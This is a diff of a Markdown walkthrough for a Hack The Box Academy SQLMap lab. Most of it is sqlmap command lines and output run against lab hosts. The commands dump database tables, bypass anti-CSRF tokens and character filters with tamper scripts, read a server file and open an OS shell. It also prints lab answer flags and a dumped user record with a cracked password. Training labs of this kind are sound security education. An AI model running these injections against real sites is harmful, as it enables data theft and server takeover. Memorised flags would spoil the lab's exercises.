@@ -12,11 +12,11 @@
 
 ![Firefox - Case2 POST Parameter (id)](./assets/screenshots/sqlmap_essentials_firefox_case2_post_parameter_id.png)
 
+```javascript
+--batch --dump
 ```
---banner --current-user --current-db --is-dba
 
-
-
+```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-ghcrxfwbqc]─[~]
 └──╼ [★]$ sqlmap 'http://83.136.250.20:40656/case2.php' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://83.136.250.20:40656/case2.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://83.136.250.20:40656' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -H 'Priority: u=0, i' --data-raw 'id=1*' --batch --dump
 
@@ -50,6 +50,10 @@ HTB{700_much_c0n6r475_0n_p057_r3qu357
  What's the contents of table `flag3`? (Case #3)
 
 ![Firefox - Case3 Cookie Value (id)](./assets/screenshots/sqlmap_essentials_firefox_case3_cookie_value_id.png)
+
+```javascript
+--batch --dump
+```
 
 ```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-ghcrxfwbqc]─[~]
@@ -85,6 +89,10 @@ HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}
  What's the contents of table `flag4`? (Case #4)
 
 ![Firefox - Case4 JSON Value (id)](./assets/screenshots/sqlmap_essentials_firefox_case4_json_value_id.png)
+
+```javascript
+--batch --dump
+```
 
 ```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-ghcrxfwbqc]─[~]
@@ -129,6 +137,10 @@ Hint: You can use the option `-T flag5` to only dump data from the needed table.
 
 ![Firefox - Case5 OR SQLi](./assets/screenshots/sqlmap_essentials_firefox_case5_or_sqli.png)
 
+```javascript
+--batch --dump
+```
+
 ```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-ghcrxfwbqc]─[~]
 └──╼ [★]$ sqlmap 'http://83.136.250.20:40656/case5.php?id=1*' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://83.136.250.20:40656/case5.php' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -H 'Priority: u=0, i' --batch --dump
@@ -140,6 +152,10 @@ Hint: You can use the option `-T flag5` to only dump data from the needed table.
 ❌
 
 [SNIP]
+```
+
+```javascript
+ --batch -T flag5 --dump --no-cast --level 3
 ```
 
 ```
@@ -175,6 +191,10 @@ What's the contents of table `flag6`? (Case #6)
 Hint: Use the prefix ``)`.
 
 ![Firefox - Case6 Non-standard Boundaries](./assets/screenshots/sqlmap_essentials_firefox_case6_non_standard_boundaries.png)
+
+```javascript
+--batch -T flag6 --dump --no-cast --prefix='`)'
+```
 
 ```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-ghcrxfwbqc]─[~]
@@ -212,6 +232,10 @@ What's the contents of table `flag7`? (Case #7)
 Hint: Try to count the number of columns in the page output, and specify them for sqlmap.
 
 ![Firefox - Case7 UNION SQLi with Adjustments](./assets/screenshots/sqlmap_essentials_firefox_case7_union_sqli_with_adjustments.png)
+
+```javascript
+--batch -T flag7 --dump --no-cast --union-cols=5
+```
 
 ```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-6hq85a6hgr]─[~]
@@ -254,6 +278,10 @@ What's the contents of table `flag1` in the `testdb` database? (Case #1)
 
 ![Firefox - Case1 GET Parameter (id)](./assets/screenshots/sqlmap_essentials_firefox_case1_get_parameter_id.png)
 
+```javascript
+--batch -D testdb -T flag1 --dump --no-cast
+```
+
 ```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-ghcrxfwbqc]─[~]
 └──╼ [★]$ sqlmap 'http://94.237.60.55:55207/case1.php?id=1*' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.60.55:55207/case1.php' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -H 'Priority: u=0, i' --batch -D testdb -T flag1 --dump --no-cast
@@ -292,6 +320,10 @@ HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}
 
 What's the name of the column containing "style" in it's name? (Case #1)
 
+```javascript
+--batch --search -C style
+```
+
 ```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-ghcrxfwbqc]─[~]
 └──╼ [★]$ sqlmap 'http://94.237.60.55:55207/case1.php?id=1*' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.60.55:55207/case1.php' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -H 'Priority: u=0, i' --batch --search -C style
@@ -326,6 +358,10 @@ PARAMETER_STYLE
 
 What's the Kimberly user's password? (Case #1)
 
+```javascript
+--batch --search -C pass
+```
+
 ```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-ghcrxfwbqc]─[~]
 └──╼ [★]$ sqlmap 'http://94.237.60.55:55207/case1.php?id=1*' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.60.55:55207/case1.php' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -H 'Priority: u=0, i' --batch --search -C pass
@@ -342,7 +378,13 @@ Table: users
 | 10946aa229a6d569f226976b22ea0e900a1fc219                    |
 
 [SNIP]
+```
 
+```javascript
+--batch -D testdb -T users --dump
+```
+
+```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-ghcrxfwbqc]─[~]
 └──╼ [★]$ sqlmap 'http://94.237.60.55:55207/case1.php?id=1*' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.60.55:55207/case1.php' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -H 'Priority: u=0, i' --batch -D testdb -T users --dump
 
@@ -358,8 +400,11 @@ Table: users
 [SNIP]
 
 | 6  | 5143241665092174 | KimberlyMWright@gmail.com   | 440-232-3739 | Kimberly Wright   | 3136 Ralph Drive       | June 18 1972      | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)      | Electrologist                                     |
-
 [SNIP]
+```
+
+```javascript
+--batch -D testdb -T users -passwords --dump
 ```
 
 ```
@@ -402,6 +447,10 @@ What's the contents of table `flag8`? (Case #8)
 
 ![Firefox - Case8 Anti-CSRF Token Bypass](./assets/screenshots/sqlmap_essentials_firefox_case8_anti_csrf_token_bypass.png)
 
+```javascript
+--batch -T flag8 --dump --no-cast --csrf-token='t0ken'
+```
+
 ```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-6hq85a6hgr]─[~]
 └──╼ [★]$ sqlmap 'http://94.237.48.226:59004/case8.php' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.48.226:59004/case8.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://94.237.48.226:59004' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=31fku0s2mf7e6tl9bjhjd8dk5s' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -H 'Priority: u=0, i' --data-raw 'id=1*&t0ken=KGoByMKyROxW8RQLEXzYKQjtkFBsOCDlZiCtgZUzQ' --batch -T flag8 --dump --no-cast --csrf-token='t0ken'
@@ -436,6 +485,10 @@ HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}
 What's the contents of table `flag9`? (Case #9)
 
 ![Firefox - Case9 Unique ID](./assets/screenshots/sqlmap_essentials_firefox_case9_unique_id.png)
+
+```javascript
+--batch -T flag9 --dump --no-cast --randomize='uid'
+```
 
 ```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-6hq85a6hgr]─[~]
@@ -472,6 +525,10 @@ What's the contents of table `flag10`? (Case #10)
 
 ![Firefox - Case10 Primitive Protection](./assets/screenshots/sqlmap_essentials_firefox_case10_primitive_protection.png)
 
+```javascript
+--batch -T flag10 --dump --no-cast --tamper=randomcase
+```
+
 ```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-6hq85a6hgr]─[~]
 └──╼ [★]$ sqlmap 'http://94.237.48.226:59004/case10.php' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.48.226:59004/case10.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://94.237.48.226:59004' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=31fku0s2mf7e6tl9bjhjd8dk5s' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -H 'Priority: u=0, i' --data-raw 'id=1*' --batch -T flag10 --dump --no-cast --tamper=randomcase
@@ -506,6 +563,10 @@ HTB{y37_4n07h3r_r4nd0m1z3}
 What's the contents of table `flag11`? (Case #11)
 
 ![Firefox - Case11 Filtering of Characters '<','>'](./assets/screenshots/sqlmap_essentials_firefox_case11_filtering_of_characters.png)
+
+```javascript
+--dump --no-cast --tamper=greatest,least --threads=10
+```
 
 ```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-6hq85a6hgr]─[~]
@@ -543,6 +604,10 @@ Try to use SQLMap to read the file `/var/www/html/flag.txt`.
 
 ![Firefox - OS Exploitation GET Parameter (id)](./assets/screenshots/sqlmap_essentials_firefox_os_exploitation_get_parameter_id.png)
 
+```javascript
+--batch --is-dba
+```
+
 ```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-s3yszxz6oh]─[~]
 └──╼ [★]$ sqlmap 'http://94.237.59.168:58202/?id=1*' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.59.168:58202/' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -H 'Priority: u=0, i' --batch --is-dba
@@ -554,6 +619,10 @@ Try to use SQLMap to read the file `/var/www/html/flag.txt`.
 current user is DBA: True
 
 [SNIP]
+```
+
+```javascript
+--batch --file-read '/var/www/html/flag.txt'
 ```
 
 ```
@@ -589,6 +658,10 @@ HTB{5up3r_u53r5_4r3_p0w3rful!}
 **Question**
 
 Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.
+
+```javascript
+--batch --os-shell
+```
 
 ```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-s3yszxz6oh]─[~]
@@ -642,8 +715,6 @@ You are given access to a web application with basic protection mechanisms. Use 
 
 What's the contents of table `final_flag`?
 
-![Firefox - Homepage](./assets/screenshots/sqlmap_essentials_firefox_homepage.png)
-
 ```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-6hq85a6hgr]─[~]
 └──╼ [★]$ vim addtochart.req
@@ -667,9 +738,13 @@ Priority: u=0
 {"id":1}
 ```
 
+```javascript
+-p id --batch
+```
+
 ```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-6hq85a6hgr]─[~]
-└──╼ [★]$ sqlmap -r addtochart.req --batch -p id
+└──╼ [★]$ sqlmap -r addtochart.req -p id --batch
 
 [SNIP]
 
@@ -690,9 +765,15 @@ web application technology: Apache 2.4.38
 back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
 
 [SNIP]
+```
 
+```javascript
+--batch --banner --dbs
+```
+
+```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-6hq85a6hgr]─[~]
-└──╼ [★]$ sqlmap -r addtochart.req --batch -p id --banner --dbs
+└──╼ [★]$ sqlmap -r addtochart.req -p id --batch --banner --dbs
 
 [SNIP]
 
@@ -710,9 +791,15 @@ back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
 ❌
 
 [SNIP]
+```
 
+```javascript
+--batch --tamper=between --banner --dbs --threads 10
+```
+
+```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-6hq85a6hgr]─[~]
-└──╼ [★]$ sqlmap -r addtochart.req --batch -p id --tamper=between --banner --dbs --threads 10
+└──╼ [★]$ sqlmap -r addtochart.req -p id --batch --tamper=between --banner --dbs --threads 10
 
 [SNIP]
 
@@ -732,9 +819,15 @@ available databases [2]:
 [*] production
 
 [SNIP]
+```
 
+```javascript
+--batch --tamper=between -D production --tables --threads 10
+```
+
+```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-6hq85a6hgr]─[~]
-└──╼ [★]$ sqlmap -r addtochart.req --batch -p id --tamper=between -D production --tables --threads 10
+└──╼ [★]$ sqlmap -r addtochart.req -p id --batch --tamper=between -D production --tables --threads 10
 
 [SNIP]
 
@@ -761,9 +854,13 @@ Database: production
 [SNIP]
 ```
 
+```javascript
+-p id --batch --tamper=between -D production -T final_flag --dump --no-cast --threads 10
+```
+
 ```
 ┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-6hq85a6hgr]─[~]
-└──╼ [★]$ sqlmap -r addtochart.req --batch -p id --tamper=between -D production -T final_flag --dump --no-cast --threads 10
+└──╼ [★]$ sqlmap -r addtochart.req -p id --batch --tamper=between -D production -T final_flag --dump --no-cast --threads 10
 
 [SNIP]
 
@@ -782,7 +879,7 @@ Table: final_flag
 **Answer**
 
 ```
-
+HTB{n07_50_h4rd_r16h7?!}
 ```
 
 ---
